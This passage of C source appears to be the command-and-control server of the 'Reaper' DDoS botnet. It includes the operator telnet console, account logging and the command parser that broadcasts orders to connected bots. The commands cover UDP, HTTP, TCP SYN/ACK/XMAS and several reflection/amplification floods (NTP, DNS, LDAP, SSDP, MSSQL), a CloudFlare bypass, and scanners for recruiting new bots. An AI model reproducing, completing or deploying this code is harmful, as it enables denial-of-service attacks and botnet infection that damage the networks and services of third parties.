        if(send(thefd, spoof_1,  strlen(spoof_1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_2,  strlen(spoof_2),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_3,  strlen(spoof_3),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_4,  strlen(spoof_4),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_5,  strlen(spoof_5),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_6,  strlen(spoof_6),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_7,  strlen(spoof_7),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_8,  strlen(spoof_8),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_9,  strlen(spoof_9),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_cmd2,  strlen(spoof_cmd2),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_line2,  strlen(spoof_line2),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_list1,  strlen(spoof_list1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_list2,  strlen(spoof_list2),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_list3,  strlen(spoof_list3),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_list4,  strlen(spoof_list4),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_list5,  strlen(spoof_list5),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_list6,  strlen(spoof_list6),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_list7,  strlen(spoof_list7),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_list8,  strlen(spoof_list8),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_list9,  strlen(spoof_list9),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_line3,  strlen(spoof_line3),   MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        { 
        sprintf(botnet, "\x1b[1;37m[%s@Reaper ~]#", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; 
        } 
        continue; 
        } 
        if(strstr(buf, "SPECIAL"))  // We Are Attempting To Display Special CMD's!
        {  // Let Us Continue Our Journey!
        SPECIAL:  // We Are Attempting To Display Special CMD's!
        pthread_create(&title, NULL, &titleWriter, sock);
        char special_cmd1  [5000]; // We Are Attempting To Display Special CMD's!
        char special_line1  [5000]; // We Are Attempting To Display Special CMD's!
        char special_1  [5000]; // We Are Attempting To Display Special CMD's!
        char special_2  [5000]; // We Are Attempting To Display Special CMD's!
        char special_3  [5000]; // We Are Attempting To Display Special CMD's!
        char special_4  [5000]; // We Are Attempting To Display Special CMD's!
        char special_5  [5000]; // We Are Attempting To Display Special CMD's!
        char special_line2  [5000]; // We Are Attempting To Display Special CMD's!

        sprintf(special_cmd1,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]Special Commands\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]     \r\n"); // We Are Attempting To Display Special CMD's!
        sprintf(special_line1,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n"); // We Are Attempting To Display Special CMD's!
        sprintf(special_1,  "\x1b[1;37m[\x1b[1;31mAdds User\x1b[1;37m]         adduser   [\x1b[0;31mUSER\x1b[1;37m] [\x1b[0;31mPASS\x1b[1;37m]\r\n"); // We Are Attempting To Display Special CMD's!
        sprintf(special_2,  "\x1b[1;37m[\x1b[1;32mIP Geolocation\x1b[1;37m]    resolve   [\x1b[0;31mIP\x1b[1;37m]\r\n"); // We Are Attempting To Display Special CMD's!
        sprintf(special_3,  "\x1b[1;37m[\x1b[1;33mSubDomain Scanner\x1b[1;37m] root_sub  [\x1b[0;31mURL\x1b[1;37m]\r\n"); // We Are Attempting To Display Special CMD's!
        sprintf(special_4,  "\x1b[1;37m[\x1b[1;34mPort Scanner\x1b[1;37m]      root_scan [\x1b[0;31mIP\x1b[1;37m]\r\n"); // We Are Attempting To Display Special CMD's!
        sprintf(special_5,  "\x1b[1;37m[\x1b[1;35mCloudFlare Bypass\x1b[1;37m] root_cf   [\x1b[0;31mURL\x1b[1;37m]\r\n"); // We Are Attempting To Display Special CMD's!
        sprintf(special_line2,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n"); // We Are Attempting To Display Special CMD's!

        if(send(thefd, special_cmd1, strlen(special_cmd1),   MSG_NOSIGNAL) == -1) goto end; // We Are Attempting To Display Special CMD's!
        if(send(thefd, special_line1, strlen(special_line1),   MSG_NOSIGNAL) == -1) goto end; // We Are Attempting To Display Special CMD's!
        if(send(thefd, special_1, strlen(special_1),   MSG_NOSIGNAL) == -1) goto end; // We Are Attempting To Display Special CMD's!
        if(send(thefd, special_2, strlen(special_2),   MSG_NOSIGNAL) == -1) goto end; // We Are Attempting To Display Special CMD's!
        if(send(thefd, special_3, strlen(special_3),   MSG_NOSIGNAL) == -1) goto end; // We Are Attempting To Display Special CMD's!
        if(send(thefd, special_4, strlen(special_4),   MSG_NOSIGNAL) == -1) goto end; // We Are Attempting To Display Special CMD's!
        if(send(thefd, special_5, strlen(special_5),   MSG_NOSIGNAL) == -1) goto end; // We Are Attempting To Display Special CMD's!
        if(send(thefd, special_line2,  strlen(special_line2),   MSG_NOSIGNAL) == -1) goto end; // We Are Attempting To Display Special CMD's!
        pthread_create(&title, NULL, &titleWriter, sock); // We Are Attempting To Display Special CMD's!
        while(1) { // We Are Attempting To Display Special CMD's!
        sprintf(botnet, "\x1b[1;37m[%s@Reaper ~]#", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }  // Let Us Continue Our Journey!
        continue; // Let Us Continue Our Journey!
        } // Let Us Continue Our Journey!
       
        if(strstr(buf, "root_add")) // We Are Attempting To Add Users!
        { // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] User Added!\r\n");  // We Are Attempting To Add Users!
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; // We Are Attempting To Add Users!
        } // Let Us Continue Our Journey!
        if(strstr(buf, "root_geo")) // We Are Attempting To Locate IPs!
        {   // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Starting geolocation!\r\n"); // We Are Sending the user a message!
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        } // Let Us Continue Our Journey!
        if(strstr(buf, "root_sub")) // We Are Attempting To Scan Subdomains! 
        {   // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Starting subdomain scan!\r\n"); // We Are Sending the user a message!
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        } // Let Us Continue Our Journey!
        if(strstr(buf, "root_scan")) // We Are Attempting To PortScan!
        {   // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Starting PortScan!\r\n"); // We Are Sending the user a message!
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        } // Let Us Continue Our Journey!
        if(strstr(buf, "root_cf")) // We Are Attempting To Bypass CloudFlare!
        {   // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Starting CF_Bypass scan!\r\n"); // We Are Sending the user a message!
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        } // Let Us Continue Our Journey!
        if(strstr(buf, "LOGOUT")) // WE ARE LOGGING OUT!
        {   // Let Us Continue Our Journey!
        printf("\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] User:[\x1b[0;36m%s\x1b[1;37m] Has Logged Out!\n", accounts[find_line].user, buf); // We Are Attempting To Logout!
        FILE *logFile;// We Are Attempting To Logout!
        logFile = fopen("LOGOUT.log", "a");// We Are Attempting To Logout!
        fprintf(logFile, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] User:[\x1b[0;36m%s\x1b[1;37m] Has Logged Out!\n", accounts[find_line].user, buf);// We Are Attempting To Logout!
        fclose(logFile);// We Are Attempting To Logout!
        goto end; // We Are Dropping Down to end:
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "logout")) // WE ARE LOGGING OUT!
        {   // Let Us Continue Our Journey!
        printf("\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] User:[\x1b[0;36m%s\x1b[1;37m] Has Logged Out!\n", accounts[find_line].user, buf);
        FILE *logFile;
        logFile = fopen("LOGOUT.log", "a");
        fprintf(logFile, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] User:[\x1b[0;36m%s\x1b[1;37m] Has Logged Out!\n", accounts[find_line].user, buf);
        fclose(logFile);
        goto end; // We Are Dropping Down to end:
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "MOVE")) // We Are logging Shell-Attempts!
        {    // Let Us Continue Our Journey!
        printf("\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] User:[\x1b[0;36m%s\x1b[1;37m] Has Attempted To Shell Your Bots!\n", accounts[find_line].user, buf);
        FILE *logFile;
        logFile = fopen("SHELL.log", "a");
        fprintf(logFile, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] User: \x1b[0;36m%s\x1b[1;37m Has Attempted To Shell Your Bots!\n", accounts[find_line].user, buf);
        fclose(logFile);
        goto end; // We Are Dropping Down to end:
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "!* STOP")) // We Are Attempting to kill Attack-Process!
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "[Reaper] Attack Stopped!");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "!* UDP")) // We Are Sending UDP Flood!
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Sending \x1b[0;31mUDP \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "!* STD")) // We Are Sending STD Flood!
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Sending \x1b[0;31mSTD \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "!* CNC")) // We Are Sending CnC Flood!
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Sending \x1b[0;31mCNC \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "!* HTTP")) // We Are Sending HTTP Flood!
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Sending \x1b[0;31mHTTP \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "!* JUNK")) // We Are Sending JUNK Flood!
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Sending \x1b[0;31mHTTP \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "!* HOLD")) // We Are Sending HOLD Flood!
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Sending \x1b[0;31mHTTP \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "!* TCP")) // We Are Sending TCP Flood!
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Loading sockets...\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "!* WGET")) // We Are Sending wget Flood!
        {  // Let Us Continue Our Journey!// Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Sending \x1b[0;31mWGET \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "XMAS")) // We Are Reading TCP And Sending XMAS Flood!
        {  // Let Us Continue Our Journey!// Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Sending \x1b[1;31mT\x1b[1;32mC\x1b[1;33mP\x1b[1;34m-\x1b[1;35mX\x1b[1;36mM\x1b[1;31mA\x1b[1;32mS \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "ALL")) // We Are Reading All TCP Methods and Sending TCP Flood!
        {  // Let Us Continue Our Journey!// Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Sending \x1b[1;31mTCP \x1b[1;37mFlood using \x1b[0;31mALL \x1b[1;37mMethods!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "SYN")) // We Are Reading TCP And Sending SYN Flood!
        {  // Let Us Continue Our Journey!// Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Sending \x1b[0;36mTCP-SYN \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "FIN")) // We Are Reading TCP And Sending FIN Flood!
        {  // Let Us Continue Our Journey!// Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Sending \x1b[0;36mTCP-FIN \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "RST")) // We Are Reading TCP And Sending RST Flood!
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Sending \x1b[0;36mTCP-RST \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "ACK")) // We Are Reading TCP And Sending ACK Flood!
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Sending \x1b[0;36mTCP-ACK \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "PSH")) // We Are Reading TCP And Sending PSH Flood!
        {  // Let Us Continue Our Journey!  
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Sending \x1b[0;36mTCP-PSH \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "PRO")) // We Are Reading TCP And Sending Pro Flood!
        {  // Let Us Continue Our Journey!  
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Sending \x1b[0;36mTCP-PRO \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "CRI")) // We Are Reading TCP And Sending Cri Flood!
        {  // Let Us Continue Our Journey!  
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Sending \x1b[0;36mTCP-CRI \x1b[1;37mFlood\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "root_ldap")) // We Are Reading Client Using IP Header Modifications and Sending LDAP Flood!
        {   // Let Us Continue Our Journey! 
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Sending \x1b[0;31mLDAP \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "root_ssdp")) // We Are Reading Client Using IP Header Modifications and Sending SSDP Flood!
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Sending \x1b[0;31mSSDP \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "root_ntp")) // We Are Reading Client Using IP Header Modifications and Sending NTP Flood!
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Sending \x1b[0;31mNTP \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "root_sentinel")) // We Are Reading Client Using IP Header Modifications and Sending SENTINEL Flood!
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Sending \x1b[0;31mSENTINEL \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "root_dns")) // We Are Reading Client Using IP Header Modifications and Sending DNS Flood!
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Sending \x1b[0;31mDNS \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "root_reaper")) // We Are Reading Client Using IP Header Modifications and Sending REAPER Flood!
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Sending \x1b[0;31mREAPER \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
          
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "root_mssql")) // We Are Reading Client Using IP Header Modifications and Sending MSSQL Flood!
        {     // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Sending \x1b[0;31mMSSQL \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "root_portmap")) // We Are Reading Client Using IP Header Modifications and Sending PORTMAP Flood!
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Sending \x1b[0;31mPORTMAP \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "root_ts3")) // We Are Reading Client Using IP Header Modifications and Sending TS3 Flood!
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Sending \x1b[0;31mTS3 \x1b[1;37mFlood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "!* SCANNER ON")) // We Are Reading Client And Starting TelNet Scanner!
        {    // Let Us Continue Our Journey!
        sprintf(botnet, "TELNET SCANNER STARTED\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "!* SCANNER OFF")) // We Are Reading Client And Stopping TelNet Scanner!
        {     // Let Us Continue Our Journey!
        sprintf(botnet, "TELNET SCANNER STOPPED\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        if (strstr(buf, "clear")) // We Are Clearing Screen!
        {   // Let Us Continue Our Journey!
        goto reaper; // We Are Going Up to reaoer:
        }  // Let Us Continue Our Journey!
        if (strstr(buf, "cls")) // We Are Clearing Screen!
        {   // Let Us Continue Our Journey!
        goto reaper;
        }  // Let Us Continue Our Journey!
        if (strstr(buf, "CLS")) // We Are Clearing Screen!
        {  // Let Us Continue Our Journey!
        goto reaper;
        } // Let Us Continue Our Journey!
        if (strstr(buf, "CLEAR")) // We Are Clearing Screen!
        {  // Let Us Continue Our Journey!
        goto reaper;
        } // Let Us Continue Our Journey!
        if (strstr(buf, "EXIT"))  // We Are Closing Connection!
        { // Let Us Continue Our Journey!
        goto end; // We Are Dropping Down to end:
        } // Let Us Continue Our Journey!
        if (strstr(buf, "exit"))  // We Are Closing Connection!
        { // Let Us Continue Our Journey!
        goto end; // We Are Dropping Down to end:
        } // Let Us Continue Our Journey!
        trim(buf);
        sprintf(botnet, "\x1b[1;37m[%s@Reaper ~]#", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(strlen(buf) == 0) continue;
        printf("\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] User:[\x1b[0;36m%s\x1b[1;37m] - Command:\x1b[1;37m[\x1b[0;36m%s\x1b[1;37m]\n",accounts[find_line].user, buf);
        FILE *logFile;
        logFile = fopen("server.log", "a");
        fprintf(logFile, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] User:[\x1b[0;36m%s\x1b[1;37m] - Command:\x1b[1;37m[\x1b[0;36m%s\x1b[1;37m]\n", accounts[find_line].user, buf);
        fclose(logFile);
        broadcast(buf, thefd, usernamez);
        memset(buf, 0, 2048);
        } // Let Us Continue Our Journey!
        end:    // cleanup dead socket
        managements[thefd].connected = 0;
        close(thefd);
        managesConnected--;
}
 
void *telnetListener(int port)
{    
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Screening Error");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)
        {  printf("\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Incoming Connection From ");
       
        client_addr(cli_addr);
        FILE *logFile;
        logFile = fopen("IP.log", "a");
        fprintf(logFile, "\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Incoming Connection From [\x1b[0;36m%d.%d.%d.%d\x1b[1;37m]\n",cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
        fclose(logFile);
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        pthread_t thread;
        pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}
 
int main (int argc, char *argv[], void *sock)
{
        signal(SIGPIPE, SIG_IGN); // ignore broken pipe errors sent from kernel
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4)
        {
        fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
        exit (EXIT_FAILURE);
        }
        port = atoi(argv[3]);
        threads = atoi(argv[2]);
        if (threads > 1000)
        {
        printf("\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Thread Limit Exceeded! Please Lower Threat Count!\n");
        return 0;
        }
        else if (threads < 1000)
        {
        printf("");
        }
        printf("\x1b[1;37m[\x1b[0;31mReaper\x1b[1;37m] Successfully Screened - Created By [\x1b[0;36mFlexingOnLamers\x1b[1;37m]\n");
        listenFD = create_and_bind(argv[1]); // try to create a listening socket, die if we can't
        if (listenFD == -1) abort();
    
        s = make_socket_non_blocking (listenFD); // try to make it nonblocking, die if we can't
        if (s == -1) abort();
 
        s = listen (listenFD, SOMAXCONN); // listen with a huuuuge backlog, die if we can't
        if (s == -1)
        {
        perror ("listen");
        abort ();
        }
        epollFD = epoll_create1 (0); // make an epoll listener, die if we can't
        if (epollFD == -1)
        {
        perror ("epoll_create");
        abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
        perror ("epoll_ctl");
        abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--)
        {
        pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL); // make a thread to command each bot individually
        }
        pthread_create(&thread[0], NULL, &telnetListener, port);
        while(1)
        {
        broadcast("PING", -1, "STRING");
        sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}